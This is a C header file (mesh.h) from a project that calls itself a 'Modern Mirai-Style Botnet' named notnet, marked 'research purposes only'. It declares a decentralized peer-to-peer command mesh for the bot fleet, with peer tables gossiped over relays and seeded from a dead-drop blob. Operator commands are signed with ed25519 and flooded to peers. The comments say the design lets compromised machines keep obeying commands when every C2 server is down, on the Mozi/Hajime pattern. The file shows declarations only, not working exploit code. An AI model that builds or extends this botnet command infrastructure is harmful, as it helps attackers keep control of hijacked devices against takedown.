/*
 * notnet - Modern Mirai-Style Botnet
 * mesh.h - Decentralized P2P command/peer mesh (#139)
 *
 * Research purposes only.
 *
 * Reuses the existing relay.c multi-hop transport (token-authenticated,
 * VIA-chained) as the P2P substrate, and the deaddrop.c "trust the
 * payload, not the transport" principle for command integrity. A bounded
 * peer table (addr:port + last-seen) is gossiped over relay sockets and
 * bootstrapped from the dead-drop blob's peer-seed list. Commands carry
 * an ed25519 signature anchored to an operator pubkey; a peer relays only
 * commands it can verify. This lets the fleet keep operating peer-to-peer
 * when every C2 endpoint is down (the Mozi/Hajime design property).
 */
#ifndef NOTNET_MESH_H
#define NOTNET_MESH_H

#include "config.h"

/* ── Peer table ───────────────────────────────────────────── */
/* A peer is a reachable mesh member's relay listener. We do NOT store the
 * ed25519 pubkey per peer — the fleet shares ONE operator pubkey baked at
 * build time (mesh_operator_pubkey), and command signatures are verified
 * against it. The peer table is just reachability. TTL-bounded gossip keeps
 * it from growing unbounded (#139 step 3). */
#define MESH_PEER_MAX      32
#define MESH_PEER_TTL      600    /* seconds before a silent peer is evicted */
#define MESH_GOSSIP_PORT   0      /* 0 = use the peer's relay_port */
#define MESH_GOSSIP_INTERVAL 120  /* seconds between gossip rounds */
#define MESH_HOP_MAX       8      /* must match relay.c RELAY_MAX_HOPS */
#define MESH_OP_PUBKEY_HEX 64     /* ed25519 pubkey, 32-byte raw -> 64 hex */

typedef struct {
    char host[256];
    uint16_t port;
    time_t last_seen;             /* 0 = slot free */
} mesh_peer_t;

/* ── Public API ───────────────────────────────────────────── */
/* Start the mesh: parse the operator pubkey, seed the peer table from
 * config + dead-drop, and run periodic gossip (a detached thread).
 * fail-closed: if mesh_enabled but no operator pubkey, refuse to start. */
int  mesh_start(notnet_bot_t *bot);
void mesh_stop(void);
int  mesh_is_running(void);

/* Peer table maintenance. */
int  mesh_add_peer(const char *host, uint16_t port);  /* returns 0 on add/update */
int  mesh_peer_count(void);
int  mesh_has_peers(void);            /* 1 if >=1 live peer */
void mesh_prune_stale(void);          /* evict MESH_PEER_TTL-expired peers */

/* Peer-seed list from the dead-drop blob (#139 step 1). The blob may carry
 * a `peers=` field ("host:port,host:port,..."). Verified via the same
 * secret echo as deaddrop; we only store them, we never trust them for
 * commands (commands are signature-gated). */
int  mesh_seed_from_blob(const char *body);

/* Signed-command verification + injection (#139 step 2). Verifies the
 * ed25519 signature over the command line against the operator pubkey.
 * On success the command is pushed onto the bot's cmd_queue so the
 * existing dispatch loop (protocol_process_commands) executes it — the
 * mesh never invents its own command semantics. Returns 0 if accepted,
 * -1 on any verification/format failure (fail-closed). */
int  mesh_verify_and_queue(notnet_bot_t *bot, const char *cmd,
                           const char *sig_hex);

/* Gossip one command to all known peers (bounded hop count). Each peer is
 * dialed THROUGH a relay using relay_connect() with a MESH payload; peers
 * that accept it verify+requeue. Returns the number of peers it was pushed
 * to. Used by the operator path when C2 is down and by relay-delivered
 * commands. */
int  mesh_gossip_command(notnet_bot_t *bot, const char *cmd, const char *sig_hex);

/* C2 dead? -> the mesh can keep the fleet alive. Helper for main():
 * returns 1 when no C2 channel is connected BUT we have live peers. */
int  mesh_c2_optional(notnet_bot_t *bot);

#endif /* NOTNET_MESH_H */
